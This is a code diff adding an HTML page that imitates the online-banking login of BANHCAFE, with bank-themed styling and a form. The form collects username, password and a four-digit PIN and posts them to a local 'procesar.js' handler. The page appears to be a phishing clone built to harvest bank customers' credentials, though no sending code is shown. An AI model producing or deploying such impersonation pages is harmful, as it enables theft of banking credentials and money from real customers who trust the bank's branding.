@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Acceso BANHCAFE</title>
+  <style>
+    :root {
+      --vino-banhcafe: #7a1c1c; 
+      --azul-banhcafe: #1b2a57;
+      --gris-texto: #888888; /* gris para texto dentro del input */
+      --fondo-claro: #f9f9f9;
+      --blanco: #ffffff;
+      --negro: #000000; /* negro para títulos y labels */
+    }
+
+    * {
+      box-sizing: border-box;
+      font-family: 'Segoe UI', sans-serif;
+    }
+
+    body {
+      margin: 0;
+      background: var(--fondo-claro);
+      color: var(--vino-banhcafe);
+    }
+
+    .main {
+      display: flex;
+      flex-direction: row;
+      justify-content: space-between;
+      align-items: center;
+      min-height: 100vh;
+      padding: 0 40px;
+      background: url('assets/background-desktop.png') no-repeat center center;
+      background-size: cover;
+    }
+
+    .contenido {
+      max-width: 50%;
+      padding-right: 30px;
+    }
+
+    .contenido h1 {
+      font-size: 40px;
+      margin-bottom: 10px;
+    }
+
+    .contenido p {
+      font-size: 18px;
+      line-height: 1.5;
+      margin-bottom: 30px;
+    }
+
+    .contenido button {
+      background-color: var(--vino-banhcafe);
+      color: var(--blanco);
+      border: none;
+      padding: 12px 22px;
+      font-size: 16px;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
+    .formulario {
+      background-color: var(--blanco);
+      padding: 30px 25px;
+      border-radius: 12px;
+      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.15);
+      border-top: 5px solid var(--vino-banhcafe);
+      max-width: 400px;
+      width: 100%;
+      text-align: center;
+      color: var(--negro); /* títulos y labels en negro */
+    }
+
+    .formulario .logo {
+      margin-bottom: 15px;
+    }
+
+    .formulario .logo img {
+      max-width: 150px;
+      height: auto;
+    }
+
+    .formulario h2 {
+      margin-bottom: 20px;
+      font-size: 20px;
+      color: var(--negro); /* banca en línea en negro */
+    }
+
+    .formulario label {
+      font-weight: bold;
+      margin-top: 10px;
+      display: block;
+      text-align: left;
+      color: var(--negro); /* Usuario, Clave, PIN en negro */
+    }
+
+    .formulario input {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid var(--vino-banhcafe);
+      border-radius: 6px;
+      margin-top: 5px;
+      color: var(--gris-texto); /* texto dentro del campo gris */
+    }
+
+    .formulario input::placeholder {
+      color: var(--gris-texto); /* placeholder gris */
+    }
+
+    .formulario button {
+      margin-top: 20px;
+      width: 100%;
+      background-color: var(--vino-banhcafe);
+      color: var(--blanco);
+      padding: 12px;
+      border: none;
+      border-radius: 6px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .formulario button:hover {
+      background-color: #5c1414;
+    }
+
+    @media (max-width: 900px) {
+      .main {
+        flex-direction: column;
+        padding: 40px 20px;
+        text-align: center;
+        background: url('assets/background-mobile.png') no-repeat center center;
+        background-size: cover;
+      }
+
+      .contenido {
+        max-width: 100%;
+        padding: 0;
+      }
+
+      .contenido h1 {
+        font-size: 30px;
+      }
+
+      .formulario {
+        margin-top: 40px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="main">
+    <!-- Columna izquierda (contenido) -->
+    <div class="contenido"></div>
+
+    <!-- Columna derecha (formulario) -->
+    <div class="formulario">
+      <div class="logo">
+        <img src="assets/logo.png" alt="Logo de la empresa">
+      </div>
+
+      <h2>Banca en línea</h2>
+      <form action="procesar.js" method="POST">
+        <label for="usuario">Usuario</label>
+        <input type="text" name="usuario" required placeholder="Ingrese su usuario">
+
+        <label for="clave">Clave</label>
+        <input type="password" name="clave" required placeholder="Ingrese su clave">
+
+        <label for="pin">PIN</label>
+        <input type="password" name="pin" required maxlength="4" 
+               pattern="\d{4}" inputmode="numeric" 
+               placeholder="****"
+               oninput="this.value=this.value.replace(/[^0-9]/g,'').slice(0,4)">
+        <button type="submit">Iniciar Sesión</button>
+      </form>
+    </div>
+  </div>
+</body>
+</html>
